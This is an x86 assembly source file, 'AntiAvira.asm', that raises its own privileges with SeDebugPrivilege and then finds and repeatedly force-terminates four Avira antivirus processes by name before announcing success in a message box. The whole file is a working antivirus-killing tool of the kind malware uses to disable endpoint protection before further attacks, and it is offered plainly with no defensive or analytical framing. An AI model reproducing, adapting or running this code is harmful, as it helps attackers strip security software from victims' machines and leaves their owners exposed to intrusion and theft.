  ; ===========================================
  ; AntiAvira.asm by lazy_cat @ 2011-06-11 0:27
  ; ===========================================
.386
.model	flat,stdcall
option	casemap:none

include		windows.inc
include		kernel32.inc
includelib	kernel32.lib
include		msvcrt.inc
include		user32.inc
includelib	user32.lib
includelib	msvcrt.lib
includelib	Advapi32.lib

OpenProcessToken	proto	:DWORD,:DWORD,:DWORD
LookupPrivilegeValueA 	proto	:DWORD,:DWORD,:DWORD
AdjustTokenPrivileges	proto	:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD

.data
SeDebugName		db	'SeDebugPrivilege',0
szProcesses		db	'avcenter.exe',0
			db	'avgnt.exe',0
			db	'avshadow.exe',0
			db	'avguard.exe',0
szText			db	'All the four processes has been terminated.',0
szCaption		db	'lazy_cat',0

.code
GetProcessIdByName	proc	szProcessName:PTR BYTE
			LOCAL	hSnapshot:HANDLE
			LOCAL	pe32:PROCESSENTRY32	; 128B
			invoke	RtlZeroMemory,addr pe32,sizeof PROCESSENTRY32
			mov	pe32.dwSize,sizeof PROCESSENTRY32
			invoke	CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,0
			mov	hSnapshot,eax
			invoke	Process32First,hSnapshot,addr pe32
			.while	eax
				invoke	_imp__strcmp,addr pe32.szExeFile,szProcessName
				.if	!eax
					invoke	CloseHandle,hSnapshot
					mov	eax,pe32.th32ProcessID
					ret
				.endif
				invoke	Process32Next,hSnapshot,addr pe32
			.endw
			invoke	CloseHandle,hSnapshot
			xor	eax,eax
			ret
GetProcessIdByName 	endp

start			proc
			LOCAL	hToken:HANDLE
			LOCAL	uid:LUID
			LOCAL	tp:TOKEN_PRIVILEGES
			lea	eax,hToken
			push	eax
			push	TOKEN_ADJUST_PRIVILEGES
			invoke	GetCurrentProcess
			push	eax
			call	OpenProcessToken
			invoke	LookupPrivilegeValueA,0,offset SeDebugName,addr uid
			mov	tp.Privileges[0].Attributes,SE_PRIVILEGE_ENABLED
			mov	eax,uid.LowPart
			mov	tp.Privileges[0].Luid.LowPart,eax
			mov	eax,uid.HighPart
			mov	tp.Privileges[0].Luid.HighPart,eax
			mov	tp.PrivilegeCount,1
			invoke	AdjustTokenPrivileges,hToken,FALSE,addr tp,sizeof TOKEN_PRIVILEGES,0,0
			invoke	CloseHandle,hToken
			mov	ecx,4
			lea	esi,szProcesses
			.while	ecx
				push	ecx
				.while	1
					push	esi
					call	GetProcessIdByName
					.break	.if	eax == 0
					invoke	OpenProcess,PROCESS_ALL_ACCESS,NULL,eax
					invoke	TerminateProcess,eax,0
					invoke	Sleep,500
				.endw
				invoke	_imp__strlen,esi
				inc	eax
				add	esi,eax
				pop	ecx
				dec	ecx
			.endw
			invoke	MessageBox,NULL,addr szText,addr szCaption,MB_ICONINFORMATION
			invoke	ExitProcess,0
start			endp
end			start